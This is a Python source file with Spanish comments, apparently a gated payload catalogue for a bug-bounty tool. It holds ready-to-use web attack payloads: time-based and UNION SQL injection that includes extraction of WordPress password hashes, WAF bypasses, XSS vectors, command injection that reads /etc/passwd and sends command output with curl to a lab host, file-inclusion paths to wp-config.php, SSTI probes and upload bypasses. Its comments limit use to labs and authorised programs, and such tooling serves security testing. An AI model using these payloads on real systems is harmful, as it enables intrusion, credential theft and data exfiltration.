#!/usr/bin/env python3
"""ARSENAL v0.54.0 — payloads de alta potencia, GATEADOS por diseno.

Este modulo NO se integra al pipeline normal del Hunter. El Hunter sigue
 cazando con canarios inertes (kxss, ids de lectura A->B). El arsenal
 existe aparte para:

  1. LABORATORIO LOCAL (WP-LAB): pruebas contra 127.0.0.1 / localhost.
     Modo por defecto: --lab. Sin blanco externo.
  2. CASOS EXTREMOS en blancos AUTORIZADOS (programa activo, reglas que
     lo permiten): --extreme. Exige doble confirmacion interactiva
     (escribir ACTIVO) o variable de entorno ARSENAL_EXTREME=1.

Politica permanente que este modulo no puede saltarse:
  - En blancos vivos: demostracion minima, sin dano, sin dump masivo.
  - Reportes a vendors: lectura/demonstracion, nunca exploit destructivo.
  - Si un programa prohibe payloads activos, el arsenal no se usa ahi.

Uso:
  python3 core/arsenal.py --list              # inventario por categoria
  python3 core/arsenal.py --cat sql --lab    # payloads para el lab local
  python3 core/arsenal.py --cat rce --extreme  # solo con doble confirmacion
"""
import argparse
import os
import sys

BANNER_WARN = """
===============================================================
!  MODO EXTREMO: PAYLOADS ACTIVOS Y DESTRUCTIVOS EN POTENCIA  !
===============================================================
Estas a punto de materializar payloads que:
  - pueden ALTERAR o DESTRUIR datos del blanco
  - pueden ejecutar comandos en el servidor (RCE)
  - pueden tumbar el servicio (DoS por carga pesada)

Reglas antes de continuar:
  1. SOLO blancos con programa de seguridad AUTORIZADO que permita
     este tipo de prueba, O tu propio laboratorio.
  2. Demostracion minima: stop al primer impacto confirmado.
  3. Sin dump masivo, sin persistencia, sin borrado.
  4. Todo queda registrado para el reporte responsable.
===============================================================
"""

# ---------------------------------------------------------------------------
# ARSENAL: cada entrada = (nombre, payload, nota de uso)
# Contenido estandar de la industria (equivalente a PayloadsAllTheThings /
# guia de pruebas OWASP): nada novedoso, pero SI activo. Manejar con criterio.
# ---------------------------------------------------------------------------

SQL_TIME = [
    ("mysql-sleep", "' OR SLEEP(5)-- -", "MySQL: 5s de pausa por registro evaluado"),
    ("mysql-sleep-bench", "' OR BENCHMARK(5000000,SHA1('x'))-- -", "MySQL sin SLEEP (bypass de filtros)"),
    ("postgres-sleep", "'; SELECT pg_sleep(5)-- -", "PostgreSQL: pausa directa"),
    ("mssql-sleep", "'; WAITFOR DELAY '0:0:5'-- -", "MSSQL: pausa por lote"),
    ("sqlite-sleep", "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000))))-- -",
     "SQLite (WP-LAB): no tiene SLEEP; esto consume CPU ~5s"),
]

SQL_UNION = [
    ("union-count", "' UNION SELECT NULL-- -", "columnas NULL hasta que el count calza"),
    ("union-extract", "' UNION SELECT NULL,user(),NULL-- -", "version/usuario del motor"),
    ("union-wpusers", "' UNION SELECT user_login,user_pass,NULL FROM wp_users-- -",
     "WP: hashes de usuarios (leer SOLO el propio hash en vivo, nunca dump)"),
    ("union-blind-if", "' AND IF(1=1,SLEEP(3),0)-- -", "ciego: condicional temporal"),
]

SQL_WAF = [
    ("comment-inline", "1/**/OR/**/1=1", "bypassea filtros de espacios con comentarios"),
    ("case-bypass", "1 oR 1=1", "case-insensitive en algunos filtros ingenuos"),
    ("url-double", "%2527%2520OR%25201%253D1", "doble URL-encode contra 1 decodificacion"),
]

XSS_CONTEXT = [
    ("tag-body", "<script>alert(document.domain)</script>", "contexto de cuerpo HTML sin filtros"),
    ("attr-quote", '" onmouseover=alert(1) x="', "dentro de atributo con comillas"),
    ("attr-noquote", "'accesskey='X'onclick='alert(1)", "tecla de acceso (sin raton, movil)"),
    ("js-string", "'-alert(1)-'", "dentro de string JS: cierra y resta"),
    ("template-lit", "${alert(1)}", "template literals JS"),
    ("svg-onload", "<svg onload=alert(1)>", "tag corto sin script: para CSP sin object-src"),
    ("img-marked", "<img src=x onerror=alert(1)>", "clasico; en lab validar CSP primero"),
    ("details-ontoggle", "<details open ontoggle=alert(1)>", "sin interaccion del usuario"),
]

RCE_CMD = [
    ("sep-semicolon", "; id", "separador clasico tras parametro de comando"),
    ("sep-pipe", "| id", "pipe al siguiente comando"),
    ("backticks", "`id`", "sustitucion inversa"),
    ("subshell", "$(id)", "sustitucion de comando moderna"),
    ("newline", "\nid", "argumento tras salto de linea (CLI via web)"),
    (" chaining", "&& cat /etc/passwd", "encadena solo si el anterior tuvo exito"),
    ("blind-dns", "$(id | curl -X POST -d @- http://LAB.local/c)", "ciego: exfil a TU lab, NUNCA a terceros"),
]

LFI_PATH = [
    ("traversal-basic", "../../../../etc/passwd", "path traversal clasico"),
    ("traversal-nul", "../../../../etc/passwd%00", "NUL byte (PHP < 5.3.4)"),
    ("php-filter", "php://filter/convert.base64-encode/resource=index.php",
     "lee codigo fuente sin ejecutarlo (PHP)"),
    ("log-poison", "/var/log/apache2/access.log", "requiere inyeccion previa de payload en el log"),
    ("wp-config", "../../../../wp-config.php", "objetivo tipico en WP: NO leer en vivo, solo confirmar inclusion"),
]

SSTI_ENGINES = [
    ("jinja2-probe", "{{7*7}}", "si responde 49 = Jinja2 activo"),
    ("jinja2-config", "{{ config }}", "dump de config (lab: ver SECRET_KEY)"),
    ("twig-probe", "{{7*'7'}}", "si responde 49 = Twig activo (7777777 = Jinja2)"),
    ("freemarker", "${7*7}", "Java FreeMarker"),
]

UPLOAD_BYPASS = [
    ("double-ext", "shell.php.jpg", "parser Apache por extension final .php en configs viejas"),
    ("null-ext", "shell.php%00.jpg", "NUL byte en nombre de archivo"),
    ("content-type", "[contenido PHP con Content-Type: image/jpeg]", "el filtro mira la cabecera, no el contenido"),
    ("pht-ext", "shell.pht", "extensiones ejecutables olvidadas: .pht .php5 .phtml"),
]

# Deserializacion PHP: solo tiene sentido en WP-LAB local con un gadget
# inventado por nosotros. En blanco vivo, unserialize se demuestra con
# un objeto inerte (log), nunca con popchain real.
DESER_PHP = [
    ("lab-gadget", 'O:9:"LabGadget":1:{s:3:"cmd";s:2:"id";}',
     "SOLO lab: clase LabGadget que nosotros mismos definimos en WP-LAB"),
    ("inert-proof", 'O:8:"stdClass":0:{}',
     "blanco vivo: demostrar que unserialize acepta input sin efectos"),
]

CATEGORIES = {
    "sql": ("Inyeccion SQL", {"time": SQL_TIME, "union": SQL_UNION, "waf": SQL_WAF}),
    "xss": ("Cross-Site Scripting", {"contextos": XSS_CONTEXT}),
    "rce": ("Ejecucion de comandos", {"separadores": RCE_CMD}),
    "lfi": ("Inclusion de archivos", {"rutas": LFI_PATH}),
    "ssti": ("Plantillas del servidor", {"motores": SSTI_ENGINES}),
    "upload": ("Bypass de subidas", {"variantes": UPLOAD_BYPASS}),
    "deser": ("Deserializacion PHP", {"lab": DESER_PHP}),
}

LAB_ONLY = {"union-wpusers", "blind-dns", "log-poison", "wp-config", "lab-gadget"}


def confirm_extreme() -> bool:
    if os.environ.get("ARSENAL_EXTREME") == "1":
        return True
    print(BANNER_WARN)
    print("Para continuar escribe EXACTAMENTE: ACTIVO")
    try:
        return input("> ").strip() == "ACTIVO"
    except EOFError:
        return False


def show(cat: str, lab: bool) -> None:
    title, groups = CATEGORIES[cat]
    print(f"\n### {title} ###\n")
    for gname, entries in groups.items():
        print(f"--- {gname} ---")
        for name, payload, note in entries:
            if not lab and name in LAB_ONLY:
                print(f"  [{name}] (solo lab) <omitido>")
                continue
            print(f"  [{name}] {payload}")
            print(f"      uso: {note}\n")


def main():
    ap = argparse.ArgumentParser(description="ARSENAL gateado de CodexRC")
    ap.add_argument("--list", action="store_true", help="inventario por categoria")
    ap.add_argument("--cat", help="categoria a mostrar")
    ap.add_argument("--lab", action="store_true",
                    help="modo laboratorio local (default seguro)")
    ap.add_argument("--extreme", action="store_true",
                    help="modo extremo: exige doble confirmacion")
    args = ap.parse_args()

    if args.list:
        print("ARSENAL v0.54.0 — categorias:")
        for c, (title, groups) in CATEGORIES.items():
            n = sum(len(g) for g in groups.values())
            print(f"  {c:8} {title} ({n} payloads)")
        print("\nUso: --cat <cat> [--lab | --extreme]")
        return 0

    if not args.cat or args.cat not in CATEGORIES:
        print("Categoria invalida. Usa --list")
        return 1

    if args.extreme:
        if not confirm_extreme():
            print("\n[ARSENAL] Confirmacion rechazada. No se entrega nada.")
            return 2
        print(f"\n[ARSENAL] MODO EXTREMO activado para '{args.cat}'.")
        print("[ARSENAL] Recordatorio: demostracion minima, stop al primer impacto.\n")
        show(args.cat, lab=False)
    else:
        show(args.cat, lab=True)
    return 0


if __name__ == "__main__":
    sys.exit(main())
